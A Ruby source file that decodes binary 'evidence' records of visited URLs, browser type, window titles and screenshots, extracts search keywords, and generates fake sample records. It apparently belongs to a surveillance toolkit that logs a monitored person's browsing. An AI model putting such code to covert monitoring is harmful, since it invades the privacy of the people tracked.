require 'rcs-common/evidence/common'

require 'CGI'

module RCS

module UrlEvidence

  VERSION_DELIMITER = 0x20100713
  ELEM_DELIMITER = 0xABADC0DE
  BROWSER_TYPE = ['Unknown', 'Internet Explorer', 'Firefox', 'Opera', 'Safari', 'Chrome', 'Mobile Safari']

  def decode_query(url)
    query = []
    query = url.scan(/(?:&|^)q=([^&]*)(?:&|$)/).first if url['google']
    query = url.scan(/(?:&|^)p=([^&]*)(?:&|$)/).first if url['yahoo']
    query = url.scan(/(?:&?|^)q=([^&]*)(?:&|$)/).first if url['bing']
    
    return CGI::unescape query.first unless query.nil? or query.empty?
    return ''
  end

  def content
    browser = [1, 2, 3, 4, 5, 6].sample
    r = rand(4)
    url = ["http://www.google.it/#hl=it&source=hp&q=pippo+baudo&aq=f&aqi=g10&aql=&oq=&gs_rfai=&fp=67a9a41ace8bb1ed", "http://reader.google.com", "https://www.facebook.com", "http://www.stackoverflow.com"][r].to_utf16le_binary_null
    window = ["Google Search", "Google Reader", "Facebook", "Stackoverflow"][r].to_utf16le_binary_null

    content = StringIO.new
    t = Time.now.getutc
    content.write [t.sec, t.min, t.hour, t.mday, t.mon, t.year, t.wday, t.yday, t.isdst ? 0 : 1].pack('l*')
    content.write [ VERSION_DELIMITER ].pack('L')
    content.write url
    content.write [ browser ].pack('L')
    content.write window
    content.write [ ELEM_DELIMITER ].pack('L')

    content.string
  end
  
  def generate_content
    ret = Array.new
    10.rand_times { ret << content() }
    ret
  end
  
  def decode_content
    stream = StringIO.new @info[:chunks].join

    evidences = Array.new
    until stream.eof?
      tm = stream.read 36
      @info[:acquired] = Time.gm(*tm.unpack('l*'), 0)
      @info[:url] = ''
      @info[:window] = ''

      delim = stream.read(4).unpack("L").first
      raise EvidenceDeserializeError.new("Malformed evidence (invalid URL version)") unless delim == VERSION_DELIMITER

      url = stream.read_utf16le_string
      @info[:url] = url.utf16le_to_utf8 unless url.nil?
      browser = stream.read(4).unpack("L").first
      @info[:browser] = BROWSER_TYPE[browser]
      window = stream.read_utf16le_string
      @info[:window] = window.utf16le_to_utf8 unless window.nil?
      @info[:keywords] = decode_query @info[:url]

      delim = stream.read(4).unpack("L").first
      raise EvidenceDeserializeError.new("Malformed URL (missing delimiter)") unless delim == ELEM_DELIMITER

      # this is not the real clone! redefined clone ...
      evidences << self.clone
    end

    return evidences
  end

end

module UrlcaptureEvidence
  include UrlEvidence

  URL_VERSION = 2010071301

  def content
    path = File.join(File.dirname(__FILE__), 'content', 'url', '00' + (rand(3) + 1).to_s + '.jpg')
    File.open(path, 'rb') {|f| f.read }
  end
  
  def generate_content
    [ content ]
  end
  
  def additional_header
    browser = [1, 2, 3, 4, 5, 6].sample
    r = rand(3)
    url = ['http://reader.google.com', 'https://www.facebook.com', 'http://www.stackoverflow.com'][r].to_utf16le_binary
    window = ['Google', 'Facebook', 'Stackoverflow'][r].to_utf16le_binary
    header = StringIO.new
    header.write [URL_VERSION, browser, url.size, window.size].pack("I*")
    header.write url
    header.write window
    
    header.string
  end
  
  def decode_additional_header(data)
    raise EvidenceDeserializeError.new("incomplete URLCAPTURE") if data.nil? or data.size == 0

    binary = StringIO.new data

    version, browser, url_len, window_len = binary.read(16).unpack("I*")
    raise EvidenceDeserializeError.new("invalid log version for URLCAPTURE") unless version == URL_VERSION

    @info[:browser] = BROWSER_TYPE[browser]
    @info[:url] = binary.read(url_len).utf16le_to_utf8
    @info[:window] = binary.read(window_len).utf16le_to_utf8
    @info[:keywords] = decode_query @info[:url]
  end

  def decode_content
    @info[:content] = @info[:chunks].first
    @info[:size] = @info[:content].size
    return [self]
  end
end


end # ::RCS